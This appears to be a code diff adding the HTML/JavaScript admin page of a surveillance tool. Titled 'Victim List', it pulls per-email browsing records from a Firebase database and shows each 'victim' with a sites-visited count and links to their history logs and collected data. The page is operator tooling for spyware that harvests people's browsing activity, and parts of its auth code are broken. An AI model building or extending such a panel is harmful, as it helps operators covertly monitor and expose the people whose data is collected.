@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Victim List</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+  />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
+    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+
+    const firebaseConfig = {
+    apiKey: "YOUR_API_KEY_HERE",
+    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+    databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_PROJECT_ID.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID",
+  };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    function normalizeEmail(email) {
+      return email.toLowerCase().replace(/,/g, ".").trim();
+    }
+
+    function getGravatarUrl(email, size = 96) {
+      const fixedEmail = normalizeEmail(email);
+      const hash = md5(fixedEmail);
+      return `https://www.gravatar.com/avatar/${hash}?s=${size}&d=404`;
+    }
+
+    function getOnlineStatus(lastSeen) {
+      if (!lastSeen || lastSeen === "Never") return false;
+      const now = new Date();
+      const seenTime = new Date(lastSeen);
+      const diffMinutes = (now - seenTime) / 1000 / 60;
+      return diffMinutes <= 15;
+    }
+
+    function renderVictims(victims) {
+      const container = document.getElementById("victimCards");
+      container.innerHTML = "";
+
+      victims.forEach((victim) => {
+        const isOnline = getOnlineStatus(victim.lastSeen);
+        const statusColor = isOnline ? "bg-green-500" : "bg-red-500";
+
+        const card = document.createElement("div");
+        card.className =
+          "bg-white shadow-md rounded-xl p-6 flex flex-col items-center text-center hover:shadow-lg transition";
+
+        const img = document.createElement("img");
+        img.className = "w-24 h-24 mb-4 rounded-full shadow-md";
+        img.src = getGravatarUrl(victim.email);
+        img.onerror = () => {
+          img.src = "https://www.gravatar.com/avatar/?d=mp&s=96";
+        };
+        card.appendChild(img);
+
+        const infoHTML = `
+          <h2 class="text-xl font-semibold text-gray-800 mb-1 flex flex-col items-center gap-1">
+            <span class="flex items-center gap-2">
+              <span class="inline-block w-3 h-3 rounded-full ${statusColor}"></span> 
+              ${victim.email}
+            </span>
+          </h2>
+          <p class="text-gray-600 text-sm mb-4"><i class="fas fa-globe mr-1"></i>Sites visited: ${victim.totalSites}</p>
+          <div class="flex gap-2">
+            <a href="history-logs.html?id=${victim.id}" class="bg-[#1C1C1C] text-white px-3 py-2 rounded hover:bg-gray-800 transition text-sm">
+              <i class="fas fa-eye mr-1"></i> History
+            </a>
+            <a href="data.html?id=${victim.id}" class="bg-[#1C1C1C] text-white px-3 py-2 rounded hover:bg-gray-800 transition text-sm">
+              <i class="fas fa-database mr-1"></i> Data
+            </a>
+          </div>
+        `;
+
+        card.insertAdjacentHTML("beforeend", infoHTML);
+        container.appendChild(card);
+      });
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const loading = document.getElementById("loading");
+      const error = document.getElementById("error");
+
+      const historyRef = ref(db, "history/season2025");
+
+      onValue(historyRef, (historySnap) => {
+        const historyData = historySnap.val();
+        if (!historyData) {
+          loading.classList.add("hidden");
+          error.textContent = "No victims found in database";
+          error.classList.remove("hidden");
+          return;
+        }
+
+        const emailKeys = Object.keys(historyData);
+        const victims = [];
+
+        emailKeys.forEach((emailKey, index) => {
+          const victimEmailRaw = emailKey.replace(/_/g, ".");
+          const fixedEmail = normalizeEmail(victimEmailRaw);
+
+          victims.push({
+            id: index,
+            email: fixedEmail,
+            lastSeen: "Never",
+            totalSites: historyData[emailKey]?.visited
+              ? Object.keys(historyData[emailKey].visited).length
+              : 0,
+          });
+        });
+
+        loading.classList.add("hidden");
+        renderVictims(victims);
+      }, (error) => {
+        loading.classList.add("hidden");
+        error.textContent = "Error loading victims: " + error.message;
+        error.classList.remove("hidden");
+      });
+    });
+  </script>
+</head>
+<body class="h-screen flex font-sans bg-gray-100">
+  <aside class="w-64 bg-[#1C1C1C] text-white flex flex-col py-8 px-4 h-full">
+    <h2 class="text-xl font-bold mb-10 px-2">Dashboard</h2>
+    <nav class="space-y-6">
+      <a href="/admin/index.html" class="flex items-center space-x-3 px-2 text-white">
+        <i class="fas fa-tachometer-alt"></i><span>Dashboard</span>
+      </a>
+      <a href="/admin/victim.html" class="flex items-center space-x-3 px-2 text-white font-bold">
+        <i class="fas fa-user-friends"></i><span>Victim</span>
+      </a>
+      <a href="/admin/login.html" class="flex items-center space-x-3 px-2 text-white">
+        <i class="fas fa-sign-out-alt"></i><span>Logout</span>
+      </a>
+    </nav>
+  </aside>
+
+  <main class="flex-1 p-6 overflow-y-auto bg-[#F5F8F7]">
+    <div class="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4 mb-6">
+      <h1 class="text-3xl font-bold text-gray-800">Victim List</h1>
+    </div>
+    <div id="loading" class="text-center text-gray-600">
+      Loading victims...
+    </div>
+    <div id="error" class="text-center text-red-500 hidden"></div>
+    <div id="victimCards" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+  </main>
+  <script>
+  
+  firebase.initializeApp(firebaseConfig);
+
+  firebase.auth().onAuthStateChanged((user) => {
+    if (!user) {
+      window.location.href = '/admin/login.html';
+    }
+  });
+
+  document.querySelector('a[href="/admin/login.html"]').addEventListener('click', (e) => {
+    e.preventDefault();
+    firebase.auth().signOut().then(() => {
+      window.location.href = '/admin/login.html';
+    });
+  });
+</script>
+</body>
+</html>
